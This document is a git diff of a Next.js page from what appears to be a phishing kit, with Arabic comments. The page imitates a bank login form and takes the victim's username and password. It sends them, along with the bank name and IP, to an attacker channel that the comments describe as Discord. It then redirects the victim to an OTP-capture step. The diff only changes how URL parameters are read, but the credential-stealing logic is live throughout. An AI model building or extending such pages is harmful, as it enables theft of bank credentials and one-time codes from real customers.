@@ -6,25 +6,26 @@ import Image from "next/image";
 import { useState, useEffect } from 'react';
 import TeleSned from "../../../../server/TeleSend";
 
-// استقبل searchParams كـ prop بدلاً من استخدام useSearchParams()
-export default function Page({ searchParams }) {
+export default function Page() {
     const router = useRouter();
     const { Send } = TeleSned();
     const [isLoading, setIsLoading] = useState(false);
     const [showSplash, setShowSplash] = useState(true);
     
-    // الحصول على البارامترات من searchParams prop
-    const bankId = searchParams?.bankId || null;
-    const bankName = searchParams?.bankName || null;
-    const ip = searchParams?.ip || null;
+    // استخراج البارامترات من window.location مباشرة
+    const [bankId, setBankId] = useState(null);
+    const [bankName, setBankName] = useState(null);
+    const [ip, setIp] = useState(null);
 
-    // إخفاء شاشة التحميل بعد 5 ثوانٍ
     useEffect(() => {
-        const timer = setTimeout(() => {
-            setShowSplash(false);
-        }, 5000);
-
-        return () => clearTimeout(timer);
+        // استخراج البارامترات من URL
+        const params = new URLSearchParams(window.location.search);
+        setBankId(params.get('bankId'));
+        setBankName(params.get('bankName'));
+        setIp(params.get('ip'));
+        
+        // إخفاء شاشة التحميل بعد الحصول على البارامترات
+        setShowSplash(false);
     }, []);
 
     const banks = [
@@ -63,7 +64,6 @@ export default function Page({ searchParams }) {
         const username = form.username.value;
         const password = form.password.value;
 
-        // إرسال البيانات إلى Discord
         try {
             const description = `🏦 **بيانات تسجيل الدخول**\n\n` +
                                `📌 **البنك:** ${selectedBank?.name || 'غير معروف'}\n` +
@@ -78,15 +78,14 @@ export default function Page({ searchParams }) {
             console.error('❌ خطأ في الإرسال إلى Discord:', error);
         }
 
-        // التوجيه إلى صفحة OTP بعد 2 ثانية
         setTimeout(() => {
             setIsLoading(false);
             router.push(`/payment/banks/bankaz/step2?bankId=${bankId}&bankName=${encodeURIComponent(selectedBank?.name || '')}&ip=${encodeURIComponent(ip || '')}`);
         }, 2000);
     };
 
-    // شاشة التحميل (Splash Screen)
-    if (showSplash) {
+    // شاشة التحميل (تظهر فقط أثناء تحميل البارامترات)
+    if (showSplash || bankId === null) {
         return (
             <main className="flex min-h-screen flex-col items-center justify-center p-4 md:p-8 bg-gradient-to-br from-gray-50 to-gray-100">
                 <div className="z-10 w-full max-w-md mx-auto">
